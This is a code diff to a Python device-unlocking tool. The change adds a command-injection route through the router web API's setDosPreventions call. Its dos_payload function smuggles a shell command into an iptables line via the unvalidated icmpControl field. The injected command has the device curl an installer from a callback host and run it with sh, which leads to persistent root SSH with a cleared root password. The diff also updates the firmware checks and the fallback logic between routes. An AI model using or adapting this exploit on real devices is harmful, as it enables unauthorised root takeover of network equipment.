@@ -821,6 +821,72 @@ class PasswordVector(Vector):
             time.sleep(3)
 
 
+def dos_payload(command: str) -> str:
+    """Wrap a command for the DoS-prevention field.
+
+    `icmpControl` is concatenated into
+    ``iptables ... --limit <v>/sec --limit-burst <v> ...`` and lands in that
+    line *twice*. Leading with a valid iptables term gives the first insertion
+    something it can parse, and the trailing ``#`` comments out the rest of the
+    line — including the second insertion — so the command runs once.
+    """
+    if "\n" in command:
+        raise IduError("a single-line command is required here")
+    return f"1 -j RETURN; {command} ; #"
+
+
+class DosPreventionVector(Vector):
+    """Injection through setDosPreventions — the route after changeUserPassword.
+
+    The request wrapper copies `icmpControl` out of the request with no
+    validation, and the model concatenates it into an iptables command. Unlike
+    the password field there is no length cap and no character filter, so this
+    route can carry the whole installer in one line. The settings that were
+    enabled before the injection are put back afterwards, because the payload
+    itself is a live iptables rule.
+    """
+
+    name = "setDosPreventions (icmpControl, R3.x)"
+
+    def execute(self, api: Api, address: str) -> None:
+        reply = api.call("getDosPreventions")
+        if not Api._ok(reply):
+            raise IduError(f"cannot read DoS settings: {reply.get('code')} "
+                           f"{reply.get('message', '')}")
+        before = reply.get("results") or {}
+
+        # The router fetches the installer itself. Keep the command on one line:
+        # dos_payload refuses anything that would split the iptables command it
+        # is spliced into.
+        payload = dos_payload(f"curl -s {address}>{STAGING_PATH}; sh {STAGING_PATH}")
+
+        # Only the fields that were enabled need restoring; the setter treats an
+        # omitted field as the "0"/default it starts from, so a partial call puts
+        # the disabled ones back too.
+        restore: dict = {}
+        for status, value, default in (
+                ("synPacketStatus", "synPackets", "128"),
+                ("udpConnectionStatus", "udpConnection", "64"),
+                ("icmpPingStatus", "icmpPing", "20"),
+                ("icmpControlStatus", "icmpControl", "20")):
+            if before.get(status) == "1":
+                restore[status] = "1"
+                restore[value] = before.get(value, default)
+
+        try:
+            response = api.call("setDosPreventions",
+                                {"icmpControlStatus": "1", "icmpControl": payload})
+            if not Api._ok(response):
+                raise IduError(f"payload rejected: {response.get('code')} "
+                               f"{response.get('message', '')}")
+            print(f"    {len(payload)}-char icmpControl payload sent")
+        finally:
+            # The command has already run by the time the call returns. A
+            # restore failure must not hide the result of the injection.
+            with contextlib.suppress(Exception):
+                api.call("setDosPreventions", restore)
+
+
 @dataclasses.dataclass
 class Verdict:
     """Assessment of whether a unit can be unlocked, from read-only probes."""
@@ -831,10 +897,13 @@ class Verdict:
     evidence: list
     test_required: bool = False
     method_closed: bool = False
+    dos_available: bool = False
 
     @property
     def unlockable(self) -> bool:
-        return bool(self.vectors) and not self.test_required and not self.method_closed
+        return bool(self.vectors) and (
+            self.dos_available
+            or (not self.test_required and not self.method_closed))
 
 
 def firmware_version(api: Api) -> str:
@@ -893,6 +962,9 @@ def check(api: Api) -> Verdict:
     PASSWORD_CUTOFF, PASSWORD_FLOOR and PASSWORD_FIXED), but the version is
     only a compatibility hint. `unlock` confirms it at runtime by probing for
     password history before it sends a payload.
+
+    The DoS route is version-independent: `getDosPreventions` is called as a
+    presence probe, and its answer is what `dos_available` records.
     """
     model = api.device.model if api.device else "?"
     version = firmware_version(api)
@@ -912,6 +984,7 @@ def check(api: Api) -> Verdict:
     vectors = []
     method_closed = False
     test_required = False
+    dos_available = False
 
     if release is None:
         vectors.append(PasswordVector.name)
@@ -947,9 +1020,20 @@ def check(api: Api) -> Verdict:
             "with unlock")
         test_required = True
 
+    # The DoS setters ship alongside the read-only getter, and the field they
+    # copy has no length cap. This probe only reads: presence is the signal,
+    # and `unlock` is what confirms the setter actually executes.
+    dos = api.call("getDosPreventions")
+    if Api._ok(dos):
+        vectors.append(DosPreventionVector.name)
+        dos_available = True
+        evidence.append("getDosPreventions present -> DoS setters registered")
+    else:
+        evidence.append("DoS module absent")
+
     return Verdict(model=model, firmware=version, vectors=vectors,
                    evidence=evidence, test_required=test_required,
-                   method_closed=method_closed)
+                   method_closed=method_closed, dos_available=dos_available)
 
 
 def _shell_for(key: str | None, host: str) -> Shell:
@@ -978,10 +1062,13 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
            verdict: Verdict | None = None, force: bool = False) -> None:
     """Exploit the API to gain root SSH.
 
-    The firmware version is a hint; the password-history probe inside the
-    vector is authoritative. A new unlock installs a persistent SSH startup
-    script and clears root's password whether or not a key is supplied. Existing reachable
-    root SSH is left as found; its persistence is not checked.
+    Two routes are tried in order: the `changeUserPassword` shell-out, then the
+    `setDosPreventions` field. The firmware version is only a hint; the
+    password-history probe inside the first vector is authoritative, and the
+    DoS route is live where the password route is patched. A new unlock installs
+    a persistent SSH startup script and clears root's password whether or not a
+    key is supplied. Existing reachable root SSH is left as found; its
+    persistence is not checked.
     """
     # An already-unlocked unit needs no exploit. A unit set up through UART can
     # still be backed up even when this firmware is outside the vulnerable
@@ -993,11 +1080,12 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
             print(f"    {_ssh_hint(key_path, api.host)}")
         return
 
-    if verdict and verdict.method_closed and not force:
+    if verdict and verdict.method_closed and not force \
+            and not verdict.dos_available:
         detail = (verdict.evidence[0] if verdict.evidence
-                  else "the changeUserPassword method is closed on this firmware")
+                  else "both injection routes are unavailable on this firmware")
         raise UnsupportedFirmware(
-            "this firmware cannot be unlocked with changeUserPassword:\n"
+            "this firmware cannot be unlocked over the web API:\n"
             f"    {detail}\n"
             "    Nothing was changed. If the web UI still offers Backup and\n"
             "    Restore, use the offline breeze method:\n"
@@ -1032,7 +1120,10 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
 
     address = callback_address(api.host, address_override)
     script = installer_script(address, pubkey)
-    vectors: list[Vector] = [PasswordVector(force=force)]
+    vectors: list[Vector] = []
+    if not verdict or not verdict.method_closed or force:
+        vectors.append(PasswordVector(force=force))
+    vectors.append(DosPreventionVector())
     total = len(vectors)
 
     print("[*] Unlocking...")
@@ -1045,8 +1136,16 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
             try:
                 with api.session("admin", password, patience):
                     vector.execute(api, address)
-            except UnsupportedFirmware:
-                raise
+            except UnsupportedFirmware as problem:
+                # A later vector can still apply — the DoS route outlives the
+                # password route — so only a refusal from the last vector ends
+                # the run.
+                if number == total:
+                    raise
+                print(f"    Method {number}/{total}: not available")
+                if VERBOSE:
+                    print(f"      {problem}")
+                continue
             except IduError as problem:
                 print(f"    Method {number}/{total}: failed")
                 if VERBOSE:
@@ -1836,19 +1935,21 @@ def main(argv: list | None = None) -> int:
                     "firmware": verdict.firmware, "unlockable": verdict.unlockable,
                     "test_required": verdict.test_required,
                     "method_closed": verdict.method_closed,
+                    "dos_available": verdict.dos_available,
                     "vectors": verdict.vectors, "evidence": verdict.evidence,
                 }))
             else:
-                state = ("NO" if verdict.method_closed
-                         else "TEST" if verdict.test_required else "YES")
+                state = ("NO" if verdict.method_closed and not verdict.dos_available
+                         else "TEST" if verdict.test_required
+                         and not verdict.dos_available else "YES")
                 print(f"[+] unlockable: {state}"
                       + (f"  via {', '.join(verdict.vectors)}"
                          if verdict.vectors else ""))
                 for line in verdict.evidence:
                     print(f"    - {line}")
-                if verdict.method_closed:
-                    print("    - this covers the changeUserPassword method only; "
-                          "no other handler is tested")
+                if verdict.method_closed and not verdict.dos_available:
+                    print("    - both known routes are unavailable: the "
+                          "password handler is fixed, and the DoS module is absent")
                     print("    - if the web UI still offers Backup and Restore, "
                           "./flash.sh breeze FILE")
                     print("      can set root SSH offline; see docs/BREEZE.md")
